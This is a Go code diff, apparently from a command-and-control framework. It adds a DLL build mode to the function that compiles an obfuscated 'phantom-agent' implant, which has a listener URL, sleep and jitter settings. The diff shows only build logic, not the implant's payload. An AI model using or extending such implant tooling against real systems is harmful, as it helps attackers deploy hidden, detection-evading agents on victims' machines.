@@ -17,6 +17,7 @@ import (
 type BuildConfig struct {
 	OS          string // "windows" or "linux"
 	Arch        string // "amd64" or "arm64"
+	BuildMode   string // "", "dll", "service"
 	ListenerURL string
 	Sleep       int
 	Jitter      int
@@ -66,7 +67,13 @@ func BuildAgent(cfg BuildConfig) (*BuildResult, error) {
 	if cfg.OS == "windows" {
 		ext = ".exe"
 	}
+	if cfg.BuildMode == "dll" {
+		ext = ".dll"
+	}
 	filename := fmt.Sprintf("phantom-agent_%s_%s%s", cfg.OS, cfg.Arch, ext)
+	if cfg.BuildMode == "dll" {
+		filename = fmt.Sprintf("phantom-agent_%s_%s.dll", cfg.OS, cfg.Arch)
+	}
 	if cfg.Obfuscate {
 		filename = fmt.Sprintf("phantom-agent_%s_%s_garbled%s", cfg.OS, cfg.Arch, ext)
 	}
@@ -100,11 +107,18 @@ func BuildAgent(cfg BuildConfig) (*BuildResult, error) {
 	env := os.Environ()
 	env = setEnv(env, "GOOS", cfg.OS)
 	env = setEnv(env, "GOARCH", cfg.Arch)
-	env = setEnv(env, "CGO_ENABLED", "0")
 
 	// Determine build command
 	var cmd *exec.Cmd
-	if cfg.Obfuscate {
+	if cfg.BuildMode == "dll" {
+		// DLL requires CGO + mingw cross-compiler
+		env = setEnv(env, "CGO_ENABLED", "1")
+		if cfg.OS == "windows" {
+			env = setEnv(env, "CC", "x86_64-w64-mingw32-gcc")
+		}
+		cmd = exec.Command("go", "build", "-buildmode=c-shared", "-ldflags", ldflags, "-o", outputPath, "./cmd/agent-dll")
+	} else if cfg.Obfuscate {
+		env = setEnv(env, "CGO_ENABLED", "0")
 		// Use garble for obfuscation
 		garblePath, err := exec.LookPath("garble")
 		if err != nil {
@@ -113,6 +127,7 @@ func BuildAgent(cfg BuildConfig) (*BuildResult, error) {
 		cmd = exec.Command(garblePath, "-literals", "-tiny", "-seed=random",
 			"build", "-ldflags", ldflags, "-o", outputPath, "./cmd/agent")
 	} else {
+		env = setEnv(env, "CGO_ENABLED", "0")
 		cmd = exec.Command("go", "build", "-ldflags", ldflags, "-o", outputPath, "./cmd/agent")
 	}
 
